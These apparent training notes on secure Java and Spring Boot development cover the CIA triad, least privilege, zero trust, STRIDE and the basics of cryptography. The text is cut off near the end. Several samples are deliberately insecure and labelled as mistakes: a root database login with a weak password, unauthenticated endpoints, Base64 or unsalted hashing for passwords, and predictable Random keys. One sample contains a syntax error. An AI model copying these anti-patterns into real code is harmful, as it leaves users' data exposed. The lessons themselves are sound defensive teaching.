
# SECURITY MINDSET & CORE PRINCIPLES
## 1. THE CIA TRIAD - Your Security North Star

Every security decision you make protects one or more of these:

```
                    ┌─────────────────┐
                    │ CONFIDENTIALITY │
                    │   (Secrecy)     │
                    └────────┬────────┘
                             │
              "Only authorized people 
               can ACCESS the data"
                             │
         ┌───────────────────┴───────────────────┐
         │                                       │
         ▼                                       ▼
┌─────────────────┐                   ┌─────────────────┐
│    INTEGRITY    │◄─────────────────►│  AVAILABILITY   │
│  (Correctness)  │                   │   (Uptime)      │
└─────────────────┘                   └─────────────────┘
         │                                       │
  "Only authorized people                "Authorized people
   can MODIFY the data"                  can access it WHEN NEEDED"
```

### Real Examples for Each:

|Principle|Attack Example|Your Code Impact|
|---|---|---|
|**Confidentiality**|SQL injection leaks user passwords|Encrypt sensitive data, use parameterized queries|
|**Integrity**|Attacker modifies transaction amount|Digital signatures, checksums, audit logs|
|**Availability**|DDoS takes down your API|Rate limiting, redundancy, graceful degradation|

### The Trade-offs (Security is ALWAYS Trade-offs)

```
MORE SECURITY ←─────────────────────────────→ MORE USABILITY

Examples:
- 2FA increases Confidentiality but reduces Availability (user locked out)
- Encryption protects Confidentiality but costs CPU (affects Availability)
- Strict validation improves Integrity but may reject valid input (Availability)

Your job: Find the RIGHT balance for your context.
```

---

## 2. DEFENSE IN DEPTH - Layers Save Lives

**The Castle Analogy:**

```
ATTACKER → [Moat] → [Wall] → [Guards] → [Locked Door] → [Safe] →  DATA

If ONE layer fails, others still protect you.
```

**In Your Spring Boot Application:**

```
                         INTERNET
                             │
                             ▼
┌────────────────────────────────────────────────────────────┐
│ LAYER 1: Network Security                                  │
│ • Firewall rules                                           │
│ • DDoS protection                                          │
│ • TLS/HTTPS only                                           │
└────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌────────────────────────────────────────────────────────────┐
│ LAYER 2: Application Gateway / Load Balancer               │
│ • Rate limiting                                            │
│ • WAF (Web Application Firewall)                           │
│ • Request validation                                       │
└────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌────────────────────────────────────────────────────────────┐
│ LAYER 3: Authentication                                    │
│ • Spring Security filters                                  │
│ • JWT validation                                           │
│ • Session management                                       │
└────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌────────────────────────────────────────────────────────────┐
│ LAYER 4: Authorization                                     │
│ • @PreAuthorize checks                                     │
│ • Role-based access                                        │
│ • Resource ownership validation                            │
└────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌────────────────────────────────────────────────────────────┐
│ LAYER 5: Input Validation                                  │
│ • Bean Validation (@Valid)                                 │
│ • Business rule validation                                 │
│ • Sanitization                                             │
└────────────────────────────────────────────────────────────┘
                             │
                             ▼
┌────────────────────────────────────────────────────────────┐
│ LAYER 6: Data Security                                     │
│ • Parameterized queries (SQL injection prevention)         │
│ • Encryption at rest                                       │
│ • Database access controls                                 │
└────────────────────────────────────────────────────────────┘
                             │
                             ▼
                            DATA
```

**Key Insight:** If your ONLY security is `@PreAuthorize`, one bug exposes everything. Real security has 5-7 layers.

---

## 3. PRINCIPLE OF LEAST PRIVILEGE (PoLP)

**The Golden Rule:** Give the MINIMUM access needed to do the job. Nothing more.

### ❌ VIOLATION - What Most Developers Do:


```java
// Database user with ALL privileges
spring.datasource.username=root
spring.datasource.password=admin123

// Service account with admin role
@Service
public class ReportService {
    // This service only READS data, but runs as ADMIN
    // If compromised, attacker can DELETE everything
}

// API endpoint accessible to all authenticated users
@GetMapping("/admin/users")
@PreAuthorize("isAuthenticated()")  // ANY logged-in user can see ALL users!
public List<User> getAllUsers() { ... }
```

### ✅ CORRECT - Least Privilege Applied:


```java
// Database user with ONLY needed privileges
// Created with: GRANT SELECT, INSERT ON orders TO app_order_service;
spring.datasource.username=app_order_service

// Service with specific, limited role
@Service
public class ReportService {
    // Runs with READ_ONLY role
    // Even if compromised, cannot modify data
}

// API endpoint with specific role requirement
@GetMapping("/admin/users")
@PreAuthorize("hasRole('USER_ADMIN')")  // Only USER_ADMIN can access
public List<User> getAllUsers() { ... }
```

### Least Privilege Checklist:

| Resource | Question to Ask |
|----------|----------------|
| Database user | Does this app need DELETE? DROP? Or just SELECT/INSERT? |
| Service account | Does this service need ADMIN? Or just specific permissions? |
| API endpoints | Should ALL authenticated users access this? Or specific roles? |
| File system | Does the app need write access? Or read-only? |
| Environment variables | Should this service see ALL secrets? Or just its own? |

---

## 4. ZERO TRUST ARCHITECTURE

**Old Model (Castle & Moat):**
```
"If you're inside the network, you're trusted"
     │
     └── This is why breaches spread so fast
         Once inside, attackers move freely
```

**Zero Trust Model:**
```
"Never trust, always verify - even internal traffic"

┌─────────────────────────────────────────────────────────────┐
│                      YOUR NETWORK                           │
│                                                             │
│   ┌─────────┐      VERIFY      ┌─────────┐                  │
│   │Service A│ ───────────────► │Service B│                  │
│   └─────────┘   • Identity     └─────────┘                  │
│                 • Permission                                │
│                 • Context                                   │
│                 • Every time                                │
│                                                             │
│   Even internal services authenticate to each other!        │
└─────────────────────────────────────────────────────────────┘
````

### Zero Trust Principles for Your Code:


```java
// ❌ OLD THINKING: "This is an internal endpoint, no auth needed"
@GetMapping("/internal/user-data")
public UserData getInternalData() {
    // "Only our services call this"... until an attacker gets in
    return userRepository.findAll();
}

// ✅ ZERO TRUST: Internal endpoints ALSO require authentication
@GetMapping("/internal/user-data")
@PreAuthorize("hasRole('INTERNAL_SERVICE') and #oauth2.hasScope('read:users')")
public UserData getInternalData() {
    // Even internal services must prove identity
    return userRepository.findAll();
}
```

### Zero Trust Checklist:

- [ ] Service-to-service communication uses mTLS or tokens
- [ ] No endpoint is "internal only" without authentication
- [ ] Network location doesn't grant trust
- [ ] Every request is authenticated AND authorized
- [ ] Assume breach has already happened

---

## 5. THREAT MODELING WITH STRIDE

Before writing code, think: **"How would an attacker break this?"**

**STRIDE** is a framework to systematically identify threats:
```
┌────────────────┬────────────────────────────────────────────────────────┐
│ Threat         │ What it means                                          │
├────────────────┼────────────────────────────────────────────────────────┤
│ S - Spoofing   │ Pretending to be someone else                          │
│                │ → Fake login, stolen session, forged JWT               │
├────────────────┼────────────────────────────────────────────────────────┤
│ T - Tampering  │ Modifying data without permission                      │
│                │ → SQL injection, man-in-the-middle, parameter tampering│
├────────────────┼────────────────────────────────────────────────────────┤
│ R - Repudiation│ Denying you did something                              │
│                │ → "I never made that transaction" (no audit log)       │
├────────────────┼────────────────────────────────────────────────────────┤
│ I - Info       │ Exposing data to unauthorized parties                  │
│   Disclosure   │ → Error messages with stack traces, data leaks         │
├────────────────┼────────────────────────────────────────────────────────┤
│ D - Denial of  │ Making the system unavailable                          │
│   Service      │ → DDoS, resource exhaustion, infinite loops            │
├────────────────┼────────────────────────────────────────────────────────┤
│ E - Elevation  │ Gaining permissions you shouldn't have                 │
│   of Privilege │ → Regular user becomes admin, IDOR attacks             │
└────────────────┴────────────────────────────────────────────────────────┘
```

### STRIDE Applied to a Simple Feature:

**Feature:** User can update their profile
```
Ask yourself for EACH letter:

S - Spoofing:      Can someone update ANOTHER user's profile?
T - Tampering:     Can they modify fields they shouldn't (e.g., role)?
R - Repudiation:   Do we log WHO made changes and WHEN?
I - Info Disclosure: Does the response leak sensitive fields?
D - Denial of Service: Can they upload a 10GB profile picture?
E - Elevation:     Can they change their role from USER to ADMIN?
````

### Quick STRIDE Example in Code:

java

```java
// Original endpoint - let's STRIDE it
@PutMapping("/users/{id}")
public User updateProfile(@PathVariable Long id, @RequestBody UserUpdateDTO dto) {
    User user = userRepository.findById(id).orElseThrow();
    user.setName(dto.getName());
    user.setEmail(dto.getEmail());
    user.setRole(dto.getRole());  // 😱 E: Elevation of Privilege!
    return userRepository.save(user);
}

// After STRIDE analysis:
@PutMapping("/users/{id}")
@PreAuthorize("#id == authentication.principal.id")  // S: Prevent Spoofing
public User updateProfile(
    @PathVariable Long id,
    @Valid @RequestBody UserUpdateDTO dto  // D: Validation prevents bad input
) {
    User user = userRepository.findById(id).orElseThrow();
    
    // T: Only allow specific fields to be updated
    user.setName(dto.getName());
    user.setEmail(dto.getEmail());
    // Role is NOT updated from DTO - E: Prevent Elevation
    
    // R: Audit logging
    auditLog.log("PROFILE_UPDATE", id, getCurrentUserId());
    
    User saved = userRepository.save(user);
    
    // I: Return limited view, not full entity
    return UserMapper.toPublicView(saved);
}
```

---

## 6. ATTACK SURFACE

**Definition:** Every point where an attacker can try to enter or extract data.

### Your Application's Attack Surface:
```
┌─────────────────────────────────────────────────────────────────────────┐
│                         ATTACK SURFACE MAP                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  EXTERNAL SURFACE (Internet-facing)                                     │
│  ├── REST API endpoints (/api/*)                                        │
│  ├── Authentication endpoints (/login, /oauth)                          │
│  ├── File upload endpoints                                              │
│  ├── Webhooks receiving external data                                   │
│  └── Public static assets                                               │
│                                                                         │
│  INTERNAL SURFACE (Service-to-service)                                  │
│  ├── Internal APIs                                                      │
│  ├── Message queue consumers (RabbitMQ)                                 │
│  ├── Database connections                                               │
│  └── Cache (Redis) connections                                          │
│                                                                         │
│  DATA SURFACE (What you store/process)                                  │
│  ├── User credentials                                                   │
│  ├── Personal data (PII)                                                │
│  ├── Business-sensitive data                                            │
│  └── Logs (might contain sensitive data!)                               │
│                                                                         │
│  DEPENDENCY SURFACE (Third-party code)                                  │
│  ├── Maven/Gradle dependencies                                          │
│  ├── Docker base images                                                 │
│  └── External APIs you call                                             │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Attack Surface Reduction Principles:
```
1. MINIMIZE: Fewer endpoints = fewer attack vectors
   • Do you NEED that /debug endpoint in production?
   • Remove unused dependencies
   
2. HARDEN: Make remaining surface tough to break
   • Input validation on every endpoint
   • Authentication on everything
   
3. MONITOR: Watch for attacks on your surface
   • Log authentication failures
   • Alert on unusual patterns

```
---

## ✅ SECURITY CHECKLIST FOR SESSION 1

□ Every feature decision considers CIA trade-offs
□ Security is layered (Defense in Depth) - not single-point
□ Database users have minimal required privileges
□ Service accounts have minimal required roles
□ API endpoints require specific roles, not just "authenticated"
□ Internal services authenticate to each other (Zero Trust)
□ New features are analyzed with STRIDE before coding
□ Attack surface is documented and minimized
□ Unused endpoints and dependencies are removed


---

## 🚫 COMMON MISTAKES

1. "We have a firewall, so we're secure"
   → Firewall is ONE layer. Equifax had firewalls too.

2. "This is an internal service, no auth needed"
   → Attackers who breach one service will find ALL unprotected internal services.

3. "The database user needs admin access for that one migration"
   → Use a SEPARATE migration user. App user stays limited.

4. "Security slows down development"
   → A breach slows down development for MONTHS. Build security in from day one.

5. "We'll add security later"
   → Technical debt that often never gets paid. Bolt-on security is always weaker.

--- 
## Summary

**Key Takeaways:**
- ==**CIA Triad is your compass for every security decision**==
- ==**Defense in Depth: Never rely on a single security control**==
- ==**Least Privilege: Give minimum access, assume breach**==
- ==**Zero Trust: Verify everything, trust nothing**==
- ==**STRIDE: Systematically find threats before attackers do**==
- ==**Attack Surface: Know it, minimize it, harden it, monitor it==**


# CRYPTOGRAPHY FOR DEVELOPERS (Part 1)

## 1. THE BIG THREE: ENCODING vs ENCRYPTION vs HASHING

This is the **#1 confusion** that causes security disasters. 
```
┌─────────────────────────────────────────────────────────────────────────┐
│                     THE FUNDAMENTAL DIFFERENCES                         │
├─────────────────┬─────────────────┬─────────────────┬───────────────────┤
│                 │    ENCODING     │   ENCRYPTION    │     HASHING       │
├─────────────────┼─────────────────┼─────────────────┼───────────────────┤
│ Purpose         │ Data format     │ Confidentiality │ Integrity/        │
│                 │ transformation  │ (hide data)     │ Verification      │
├─────────────────┼─────────────────┼─────────────────┼───────────────────┤
│ Reversible?     │ YES (always)    │ YES (with key)  │ NO (one-way)      │
├─────────────────┼─────────────────┼─────────────────┼───────────────────┤
│ Key required?   │ NO              │ YES             │ NO                │
├─────────────────┼─────────────────┼─────────────────┼───────────────────┤
│ Security?       │ NONE!           │ YES             │ YES               │
├─────────────────┼─────────────────┼─────────────────┼───────────────────┤
│ Examples        │ Base64, URL     │ AES, RSA        │ SHA-256, bcrypt   │
│                 │ encoding, UTF-8 │ ChaCha20        │ Argon2            │
├─────────────────┼─────────────────┼─────────────────┼───────────────────┤
│ Use for         │ Data transport  │ Secrets, PII,   │ Passwords,        │
│                 │ Binary→Text     │ sensitive data  │ checksums, tokens │
└─────────────────┴─────────────────┴─────────────────┴───────────────────┘
```

### ENCODING - NOT SECURITY! 


Encoding is like changing languages - anyone who knows the language can read it.
```
Original:  "Hello"
Base64:    "SGVsbG8="
URL:       "Hello%20World"
```


**==THERE IS NO SECRET. Anyone can decode it.==**


```java
// ❌ DANGEROUS MISCONCEPTION - This is NOT security!
public class BadSecurity {
    
    public String "encode"Password(String password) {
        // Base64 is NOT encryption! Anyone can decode this!
        return Base64.getEncoder().encodeToString(password.getBytes());
    }
    
    public String encodeApiKey(String apiKey) {
        // Still readable by anyone!
        return Base64.getEncoder().encodeToString(apiKey.getBytes());
    }
}

// Attacker decodes in 1 second:
// echo "SGVsbG8=" | base64 -d
// Output: Hello
```

**When to use Encoding:**
- Transmitting binary data over text protocols (email attachments, JSON)
- URL-safe strings
- ==**NEVER for security!**==

---

### ENCRYPTION - Reversible WITH a Key 

Encryption is like a safe - you need the key to open it.
```

Original:    "Hello"
             + Key: "mysecretkey"
                    ↓
Encrypted:   "U2FsdGVkX1+..." (gibberish without key)
                    ↓
             + Key: "mysecretkey"
                    ↓
Decrypted:   "Hello"
```

**When to use Encryption:**
- Storing sensitive data you need to READ later (credit cards, PII)
- Data in transit (HTTPS/TLS)
- File encryption
- ==**NEVER for passwords!**== (You don't need to read passwords back)

---

### HASHING - One-Way, No Going Back 
Hashing is like a meat grinder - you can't un-grind meat.
```
Original:    "Hello"
                ↓
Hash:        "185f8db32271fe25f561a6fc938b2e26..." (SHA-256)
                ↓
Original:    ??? (IMPOSSIBLE to reverse)
```


Same input **ALWAYS** produces same output. Different input produces COMPLETELY different output.
```
"Hello"  → 185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969
"hello"  → 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
"Hello!" → 33072bed7d6a2991030be4f3be95a0f3fc07c0f71b3c3e73139d8e3e32b22ab0
```


One character change = completely different hash (avalanche effect)

**When to use Hashing:**

- **==Password storage (with salt!)==**
- **==Data integrity verification (checksums)==**
- **==Digital signatures==**
- **==Token generation**==

---

### ❌ CRITICAL MISTAKES IN THE WILD

```java
// MISTAKE 1: Base64 for "hiding" sensitive data
String encoded = Base64.encode(creditCard);  // Anyone can decode!

// MISTAKE 2: Encryption for passwords
String encrypted = AES.encrypt(password, key);  
// If key is stolen, ALL passwords exposed at once!

// MISTAKE 3: Simple hashing for passwords (no salt)
String hashed = SHA256.hash(password);  
// Rainbow table attack: pre-computed hashes defeat this instantly

// MISTAKE 4: MD5/SHA1 for anything security-related
String hash = MD5.hash(data);  // Broken! Collisions found.
```

### ✅ CORRECT USAGE


```java
// Encoding: Only for data format conversion
String base64 = Base64.getEncoder().encodeToString(binaryData);

// Encryption: For data you need to read back
String encrypted = AES_GCM.encrypt(creditCardNumber, secretKey);
String decrypted = AES_GCM.decrypt(encrypted, secretKey);

// Hashing: For passwords (use specialized password hashers)
String passwordHash = BCrypt.hashpw(password, BCrypt.gensalt(12));
boolean matches = BCrypt.checkpw(inputPassword, passwordHash);
```

---

## 2. SYMMETRIC ENCRYPTION - One Key for Both

**Concept:** Same key encrypts AND decrypts.
```
        ┌─────────────┐
        │  SAME KEY   │
        │   🔑        │
        └──────┬──────┘
               │
     ┌─────────┴─────────┐
     │                   │
     ▼                   ▼
┌─────────┐         ┌─────────┐
│ ENCRYPT │         │ DECRYPT │
└─────────┘         └─────────┘
     │                   │
     ▼                   ▼
"Hello" ──────► "x7#kL..." ──────► "Hello"
```

### AES (Advanced Encryption Standard) - The Gold Standard

AES is the most widely used symmetric encryption algorithm.
Used by: Banks, governments, HTTPS, disk encryption, everywhere.

Key sizes:
- AES-128: Good security, faster
- AES-192: Better security
- AES-256: Best security (recommended for sensitive data)


### AES Modes - This Matters!
```
┌─────────────┬────────────────────────────────────────────────────────────┐
│ Mode        │ Description                                                │
├─────────────┼────────────────────────────────────────────────────────────┤
│ ECB         │ ❌ NEVER USE! Same plaintext = same ciphertext            │
│             │    Famous "ECB Penguin" demonstrates the flaw              │
├─────────────┼────────────────────────────────────────────────────────────┤
│ CBC         │ ⚠️ Okay with random IV, but vulnerable to padding oracles │
├─────────────┼────────────────────────────────────────────────────────────┤
│ GCM         │ ✅ RECOMMENDED! Authenticated encryption (integrity check) │
│             │    Detects if ciphertext was tampered with                 │
├─────────────┼────────────────────────────────────────────────────────────┤
│ CTR         │ ✅ Good, but no built-in authentication                    │
└─────────────┴────────────────────────────────────────────────────────────┘
```

**==ALWAYS USE AES-GCM (Galois/Counter Mode)==**

### Why ECB is Dangerous - The Penguin Proof

ECB Mode encrypts each block independently. Same plaintext block = Same ciphertext block.

```
ECB Mode encrypts each block independently.
Same plaintext block = Same ciphertext block.

Original Image:          ECB Encrypted:          Proper Encryption (CBC/GCM):
┌──────────────┐         ┌──────────────┐        ┌──────────────┐
│   🐧🐧🐧     │         │   🐧🐧🐧     │        │   ░░░░░░     │
│  🐧🐧🐧🐧   │  ────►  │  🐧🐧🐧🐧   │        │  ░░░░░░░░   │
│   🐧🐧🐧     │         │   🐧🐧🐧     │        │   ░░░░░░     │
└──────────────┘         └──────────────┘        └──────────────┘
                         Pattern visible!        Random noise!
````

### Java AES-GCM Implementation

```java
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.security.SecureRandom;
import java.util.Base64;

public class AESEncryption {
    
    private static final String ALGORITHM = "AES/GCM/NoPadding";
    private static final int GCM_IV_LENGTH = 12;      // 96 bits recommended for GCM
    private static final int GCM_TAG_LENGTH = 128;    // Authentication tag length
    
    /**
     * Generate a secure AES-256 key
     */
    public static SecretKey generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(256);  // AES-256
        return keyGen.generateKey();
    }
    
    /**
     * Encrypt data with AES-GCM
     * Returns: IV + Ciphertext (IV is prepended for decryption)
     */
    public static byte[] encrypt(byte[] plaintext, SecretKey key) throws Exception {
        // Generate random IV (NEVER reuse IV with same key!)
        byte[] iv = new byte[GCM_IV_LENGTH];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);
        
        // Initialize cipher
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, spec);
        
        // Encrypt
        byte[] ciphertext = cipher.doFinal(plaintext);
        
        // Prepend IV to ciphertext (needed for decryption)
        byte[] result = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(ciphertext, 0, result, iv.length, ciphertext.length);
        
        return result;
    }
    
    /**
     * Decrypt data with AES-GCM
     * Input format: IV + Ciphertext
     */
    public static byte[] decrypt(byte[] encryptedData, SecretKey key) throws Exception {
        // Extract IV from beginning
        byte[] iv = new byte[GCM_IV_LENGTH];
        System.arraycopy(encryptedData, 0, iv, 0, iv.length);
        
        // Extract ciphertext
        byte[] ciphertext = new byte[encryptedData.length - iv.length];
        System.arraycopy(encryptedData, iv.length, ciphertext, 0, ciphertext.length);
        
        // Initialize cipher
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
        cipher.init(Cipher.DECRYPT_MODE, key, spec);
        
        // Decrypt (will throw exception if tampered!)
        return cipher.doFinal(ciphertext);
    }
    
    // Convenience methods for String
    public static String encryptString(String plaintext, SecretKey key) throws Exception {
        byte[] encrypted = encrypt(plaintext.getBytes("UTF-8"), key);
        return Base64.getEncoder().encodeToString(encrypted);
    }
    
    public static String decryptString(String ciphertext, SecretKey key) throws Exception {
        byte[] encrypted = Base64.getDecoder().decode(ciphertext);
        byte[] decrypted = decrypt(encrypted, key);
        return new String(decrypted, "UTF-8");
    }
}
```

### Usage Example

java

```java
public class EncryptionDemo {
    public static void main(String[] args) throws Exception {
        // Generate key (store this securely!)
        SecretKey key = AESEncryption.generateKey();
        
        // Encrypt sensitive data
        String creditCard = "4111-1111-1111-1111";
        String encrypted = AESEncryption.encryptString(creditCard, key);
        System.out.println("Encrypted: " + encrypted);
        // Output: "dGhpcyBpcyBub3QgcmVhbCBjaXBoZXJ0ZXh0Li4u..."
        
        // Decrypt when needed
        String decrypted = AESEncryption.decryptString(encrypted, key);
        System.out.println("Decrypted: " + decrypted);
        // Output: "4111-1111-1111-1111"
        
        // Tamper detection (GCM integrity check)
        try {
            byte[] tampered = Base64.getDecoder().decode(encrypted);
            tampered[20] ^= 1;  // Flip one bit
            AESEncryption.decrypt(tampered, key);
        } catch (Exception e) {
            System.out.println("Tampering detected: " + e.getMessage());
            // Output: "Tampering detected: Tag mismatch!"
        }
    }
}
```

---

## 3. ASYMMETRIC ENCRYPTION - Two Keys

**Concept:** Public key encrypts, Private key decrypts (or vice versa for signing).
```
┌──────────────────────────────────────────────────────────────────────┐
│                    ASYMMETRIC ENCRYPTION                             │
│                                                                      │
│     PUBLIC KEY 🔓              PRIVATE KEY 🔐                        │
│     (Share freely)             (Keep secret!)                        │
│                                                                      │
│         │                           │                                │
│         ▼                           ▼                                │
│    ┌─────────┐                 ┌─────────┐                          │
│    │ ENCRYPT │                 │ DECRYPT │                          │
│    └─────────┘                 └─────────┘                          │
│         │                           │                                │
│         └───────────────────────────┘                                │
│                      │                                               │
│                      ▼                                               │
│              "Hello" → "x#7L..." → "Hello"                          │
│                                                                      │
│  Anyone with public key can encrypt.                                 │
│  ONLY private key holder can decrypt.                                │
└──────────────────────────────────────────────────────────────────────┘
```

### RSA vs ECC
```
┌──────────────┬─────────────────────────────────────────────────────────┐
│              │  RSA                        │  ECC (Elliptic Curve)     │
├──────────────┼─────────────────────────────┼───────────────────────────┤
│ Security     │ 2048-bit = 112-bit security │ 256-bit = 128-bit security│
│              │ 3072-bit = 128-bit security │ 384-bit = 192-bit security│
├──────────────┼─────────────────────────────┼───────────────────────────┤
│ Key Size     │ Large (2048-4096 bits)      │ Small (256-384 bits)      │
├──────────────┼─────────────────────────────┼───────────────────────────┤
│ Speed        │ Slower                      │ Faster                    │
├──────────────┼─────────────────────────────┼───────────────────────────┤
│ Use Cases    │ Legacy systems, X.509 certs │ Modern TLS, mobile, JWT   │
├──────────────┼─────────────────────────────┼───────────────────────────┤
│ Recommended  │ RSA-2048 minimum            │ P-256 or P-384            │
│              │ RSA-4096 for long-term      │ Ed25519 for signatures    │
└──────────────┴─────────────────────────────┴───────────────────────────┘
```

**For new systems: Prefer ECC (smaller, faster, same security)** 
**For compatibility: RSA-2048+ still fine**

### Why Asymmetric Encryption Exists

**Problem:** How do you share a symmetric key securely?
```
SYMMETRIC ONLY (The Problem):

Alice                                      Bob
  │                                          │
  │  "I'll encrypt with key K"               │
  │                                          │
  │  But how do I send K to Bob securely?    │
  │  If I send K unencrypted, attacker gets it│
  │                                          │
  │  ──────── Key K (intercepted!) ────────► │
  │                                          │
  │             😈 Attacker has K!            │
  
  
HYBRID APPROACH (The Solution):

Alice                                      Bob
  │                                          │
  │  1. Bob generates RSA key pair           │
  │                                          │
  │  ◄──── Bob's PUBLIC key ────────────     │
  │                                          │
  │  2. Alice generates random AES key       │
  │     Encrypts AES key WITH Bob's          │
  │     public RSA key                       │
  │                                          │
  │  ──── Encrypted AES key ────────────►    │
  │                                          │
  │  3. Bob decrypts AES key with his        │
  │     PRIVATE RSA key                      │
  │                                          │
  │  4. Now both have the AES key!           │
  │     Use fast symmetric encryption        │
  │                                          │
  │  ════ AES encrypted data ═══════════►    │

This is EXACTLY how HTTPS/TLS works!
```

### RSA in Java

java

```java
import java.security.*;
import javax.crypto.Cipher;
import java.util.Base64;

public class RSAEncryption {
    
    private static final String ALGORITHM = "RSA/ECB/OAEPWithSHA-256AndMGF1Padding";
    // OAEP padding is secure, PKCS1 is legacy (avoid for new code)
    
    /**
     * Generate RSA key pair (2048-bit minimum!)
     */
    public static KeyPair generateKeyPair() throws Exception {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);  // Use 4096 for extra security
        return generator.generateKeyPair();
    }
    
    /**
     * Encrypt with PUBLIC key
     * Anyone can do this - public key is shared
     */
    public static byte[] encrypt(byte[] plaintext, PublicKey publicKey) throws Exception {
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        return cipher.doFinal(plaintext);
    }
    
    /**
     * Decrypt with PRIVATE key
     * Only the key owner can do this
     */
    public static byte[] decrypt(byte[] ciphertext, PrivateKey privateKey) throws Exception {
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.DECRYPT_MODE, privateKey);
        return cipher.doFinal(ciphertext);
    }
    
    // String convenience methods
    public static String encryptString(String plaintext, PublicKey publicKey) throws Exception {
        byte[] encrypted = encrypt(plaintext.getBytes("UTF-8"), publicKey);
        return Base64.getEncoder().encodeToString(encrypted);
    }
    
    public static String decryptString(String ciphertext, PrivateKey privateKey) throws Exception {
        byte[] encrypted = Base64.getDecoder().decode(ciphertext);
        byte[] decrypted = decrypt(encrypted, privateKey);
        return new String(decrypted, "UTF-8");
    }
}
```

### RSA Usage Example



```java
public class RSADemo {
    public static void main(String[] args) throws Exception {
        // Generate key pair
        KeyPair keyPair = RSAEncryption.generateKeyPair();
        PublicKey publicKey = keyPair.getPublic();    // Share this
        PrivateKey privateKey = keyPair.getPrivate(); // Keep SECRET!
        
        // Anyone can encrypt with public key
        String secret = "MySecretPassword123";
        String encrypted = RSAEncryption.encryptString(secret, publicKey);
        System.out.println("Encrypted: " + encrypted);
        
        // Only private key holder can decrypt
        String decrypted = RSAEncryption.decryptString(encrypted, privateKey);
        System.out.println("Decrypted: " + decrypted);
    }
}
```

### When to Use Which?
```
┌─────────────────────────────────────────────────────────────────────────┐
│                    ENCRYPTION DECISION TREE                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Need to encrypt data?                                                  │
│         │                                                               │
│         ▼                                                               │
│  Same party encrypts AND decrypts?                                      │
│         │                                                               │
│    YES  │  NO                                                           │
│    │    │                                                               │
│    │    └──► Different parties?                                         │
│    │              │                                                     │
│    │         YES  │                                                     │
│    │              ▼                                                     │
│    │         ASYMMETRIC (RSA/ECC)                                       │
│    │         • Key exchange                                             │
│    │         • Digital signatures                                       │
│    │         • TLS handshake                                            │
│    │                                                                    │
│    ▼                                                                    │
│  SYMMETRIC (AES-GCM)                                                    │
│  • Database field encryption                                            │
│  • File encryption                                                      │
│  • Session data                                                         │
│                                                                         │
│  In practice: HYBRID approach (asymmetric to exchange symmetric key)    │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 4. KEY SIZE MATTERS
```
KEY SIZE = TIME TO BRUTE FORCE

┌───────────────────┬────────────────────────────────────────────────────┐
│ Key Size          │ Brute Force Time (with current technology)         │
├───────────────────┼────────────────────────────────────────────────────┤
│ 56-bit (DES)      │ Hours to days (BROKEN - never use!)               │
│ 64-bit            │ Days to weeks (BROKEN)                            │
│ 128-bit (AES-128) │ Billions of years (secure)                        │
│ 256-bit (AES-256) │ Heat death of universe (very secure)              │
└───────────────────┴────────────────────────────────────────────────────┘
```

**==Each additional bit DOUBLES the brute force time!==**

### Recommended Key Sizes (2024+)

SYMMETRIC:
- AES-128: Acceptable for most use cases
- AES-256: Recommended for sensitive data, future-proof

ASYMMETRIC (RSA):
- RSA-1024: ❌ BROKEN - Never use!
- RSA-2048: ✅ Minimum acceptable (equivalent to ~112-bit symmetric)
- RSA-3072: ✅ Better (equivalent to ~128-bit symmetric)
- RSA-4096: ✅ Best for long-term secrets

ASYMMETRIC (ECC):
- P-256: ✅ Equivalent to AES-128 / RSA-3072
- P-384: ✅ Equivalent to AES-192
- P-521: ✅ Equivalent to AES-256

HASHING:
- MD5:    ❌ BROKEN
- SHA-1:  ❌ BROKEN
- SHA-256: ✅ Recommended
- SHA-384: ✅ High security
- SHA-512: ✅ Maximum security


---

## 5. SECURE RANDOM - The Foundation

**Critical:** Bad randomness = broken encryption.

java

```java
// ❌ NEVER use for security!
Random random = new Random();  // Predictable! Can be reverse-engineered.
int key = random.nextInt();    // Attacker can predict future values!

// ❌ NEVER use for security!
Random seeded = new Random(System.currentTimeMillis());  
// Attacker knows approximate time = can guess seed

// ✅ ALWAYS use for security!
SecureRandom secureRandom = new SecureRandom();
byte[] key = new byte[32];
secureRandom.nextBytes(key);  // Cryptographically secure
```

### Why ``java.util.Random`` is Dangerous

```java
java.util.Random uses a Linear Congruential Generator (LCG):
    next = (seed * 25214903917 + 11) mod 2^48
```

If attacker sees a few outputs, they can:
1. Reverse-engineer the seed
2. Predict ALL future "random" values
3. Break your encryption

``SecureRandom`` uses OS entropy sources (``/dev/urandom`` on Linux) which are truly unpredictable.


---

## ✅ SECURITY CHECKLIST FOR SESSION 2

□ Never confuse encoding (Base64) with encryption
□ Never use encryption for passwords (use hashing - next session)
□ Always use AES-GCM mode (never ECB!)
□ Never reuse IV/nonce with the same key
□ Use AES-256 for sensitive data
□ Use RSA-2048 minimum (RSA-4096 preferred)
□ Always use ``SecureRandom`` for key generation
□ Store keys securely (not in code, not in config files)
□ Use OAEP padding for RSA (not PKCS1v1.5)


---

## 🚫 COMMON MISTAKES

1. "I'll just Base64 encode the password"
   → Base64 is NOT security. Anyone can decode it.

2. "AES is AES, the mode doesn't matter"
